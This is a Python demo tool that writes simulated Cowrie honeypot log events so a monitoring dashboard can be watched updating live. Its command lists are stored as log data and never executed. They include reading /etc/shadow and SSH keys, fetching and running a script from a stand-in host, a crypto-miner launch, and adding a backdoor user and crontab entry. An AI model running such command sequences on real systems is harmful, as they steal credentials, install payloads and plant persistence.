"""
Fake attackers for demos: appends Cowrie-style JSON lines to the log file so you
can watch the dashboard update live.

    python tools/simulate.py                 # runs until you press Ctrl+C
    python tools/simulate.py --count 20      # 20 attack sessions, then stop
    python tools/simulate.py --log /path/to/cowrie.json --fast
"""
import argparse
import json
import random
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path

DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "cowrie.json"
# Reserved "documentation" addresses: safe, and never real people.
IPS = [f"192.0.2.{n}" for n in range(10, 40)] + [f"198.51.100.{n}" for n in range(10, 30)] \
    + [f"203.0.113.{n}" for n in range(10, 30)]
CLIENTS = ["SSH-2.0-libssh-0.6.3", "SSH-2.0-OpenSSH_7.4", "SSH-2.0-paramiko_2.7.2", "SSH-2.0-Go", "SSH-2.0-Mirai"]
USERS = ["root", "admin", "postgres", "ubuntu", "test", "pi"]
PASSWORDS = ["123456", "admin", "password", "root", "toor", "raspberry"]

SCRIPTS = {
    "recon": ["whoami", "uname -a", "cat /etc/os-release", "ps aux", "ifconfig", "netstat -tulpn"],
    "creds": ["cat /etc/passwd", "cat /etc/shadow", "ls -la /root/.ssh", "cat ~/.bash_history"],
    "dropper": ["cd /tmp", "wget http://203.0.113.99/x.sh", "chmod +x x.sh", "./x.sh", "history -c"],
    "miner": ["cd /tmp", "wget http://203.0.113.99/xmrig", "chmod +x xmrig", "./xmrig -o stratum+tcp://pool.example:3333"],
    "backdoor": ["useradd -m support", "passwd support", "crontab -l", "echo '* * * * * /tmp/x' >> /etc/crontab"],
}


def now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


class Writer:
    def __init__(self, path, pause):
        self.path, self.pause = Path(path), pause

    def emit(self, eventid, session, ip, **fields):
        event = {"eventid": eventid, "timestamp": now(), "session": session, "src_ip": ip,
                 "sensor": "simulator", **fields}
        with open(self.path, "a", encoding="utf-8") as f:
            f.write(json.dumps(event) + "\n")
        print(f"  {eventid:28} {ip:16} {fields.get('input', fields.get('username', ''))}")
        time.sleep(random.uniform(*self.pause))


def one_session(w):
    ip, sid = random.choice(IPS), uuid.uuid4().hex[:12]
    kind = random.choice(["scan", "bruteforce", "recon", "creds", "dropper", "miner", "backdoor"])
    print(f"\nSession {sid} from {ip} ({kind})")
    w.emit("cowrie.session.connect", sid, ip, src_port=random.randint(10000, 60000), protocol="ssh")
    w.emit("cowrie.client.version", sid, ip, version=random.choice(CLIENTS))
    if kind == "scan":
        w.emit("cowrie.session.closed", sid, ip, duration=1)
        return
    fails = random.randint(4, 9) if kind == "bruteforce" else random.choice([0, 0, 1, 2])
    for _ in range(fails):
        w.emit("cowrie.login.failed", sid, ip, username=random.choice(USERS), password=random.choice(PASSWORDS))
    if kind == "bruteforce" and random.random() < 0.5:
        w.emit("cowrie.session.closed", sid, ip, duration=5)
        return
    w.emit("cowrie.login.success", sid, ip, username=random.choice(USERS[:3]), password=random.choice(PASSWORDS))
    steps = {"recon": ["recon"], "bruteforce": ["recon"], "creds": ["recon", "creds"],
             "dropper": ["recon", "dropper"], "miner": ["miner"], "backdoor": ["recon", "backdoor"]}[kind]
    for group in steps:
        for command in SCRIPTS[group]:
            w.emit("cowrie.command.input", sid, ip, input=command, message=f"CMD: {command}")
    w.emit("cowrie.session.closed", sid, ip, duration=random.randint(5, 120))


def main():
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--log", default=str(DEFAULT_LOG), help="Cowrie JSON file to append to")
    p.add_argument("--count", type=int, default=0, help="number of sessions (0 = forever)")
    p.add_argument("--fast", action="store_true", help="no pauses between events")
    args = p.parse_args()
    writer = Writer(args.log, (0, 0) if args.fast else (0.3, 1.5))
    Path(args.log).parent.mkdir(parents=True, exist_ok=True)
    print(f"Appending fake attacks to {args.log}  (Ctrl+C to stop)")
    done = 0
    try:
        while not args.count or done < args.count:
            one_session(writer)
            done += 1
            if not args.fast:
                time.sleep(random.uniform(1, 4))
    except KeyboardInterrupt:
        print("\nStopped.")


if __name__ == "__main__":
    main()
